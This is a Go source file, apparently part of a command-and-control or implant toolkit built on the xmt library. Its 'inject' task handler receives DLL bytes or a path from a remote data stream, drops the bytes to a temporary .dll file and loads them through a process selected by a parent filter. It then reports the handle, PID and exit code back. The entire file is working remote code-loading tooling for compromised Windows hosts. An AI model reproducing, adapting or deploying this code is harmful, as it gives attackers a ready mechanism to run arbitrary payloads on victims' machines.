//go:build windows
// +build windows

package wintask

import (
	"context"
	"os"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/data"
)

func inject(x context.Context, r data.Reader, w data.Writer) error {
	var (
		d   DLL
		err = d.UnmarshalStream(r)
	)
	if err != nil {
		return err
	}
	n := d.Path
	if len(d.Data) > 0 {
		f, err2 := os.CreateTemp("", "*.dll")
		if err2 != nil {
			return err2
		}
		_, err = f.Write(d.Data)
		if f.Close(); err != nil {
			return err
		}
		n = f.Name()
	}
	e := cmd.NewDllContext(x, n)
	e.SetParent(d.Filter)
	if err = e.Start(); err != nil {
		return err
	}
	h, _ := e.Handle()
	w.WriteUint64(uint64(h))
	if w.WriteUint32(e.Pid()); !d.Wait {
		w.WriteInt32(0)
		return nil
	}
	err = e.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	v, _ := e.ExitCode()
	w.WriteInt32(v)
	return nil
}
